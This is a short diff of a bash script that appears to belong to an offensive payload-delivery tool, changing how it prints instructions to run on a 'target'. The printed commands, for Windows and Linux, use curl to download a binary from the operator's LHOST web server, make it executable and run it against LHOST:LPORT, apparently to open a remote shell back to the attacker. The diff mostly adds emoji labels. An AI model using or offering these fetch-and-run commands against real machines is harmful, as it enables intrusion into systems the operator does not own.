@@ -87,15 +87,13 @@ else
 
 fi
 
-echo "[*] Copy/paste following command on target:"
+echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
 if [[ "$GITAR" ]]; then
-	echo "curl -O ${LHOST}:${WEBPORT}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
 else
-    if [[ "$WINDOWS" ]]; then
-        echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
-    else
-        echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
-    fi
+    echo
+    echo "(🪟) curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
+    echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
 fi
 
 # echo "[*] Enjoy meal!"
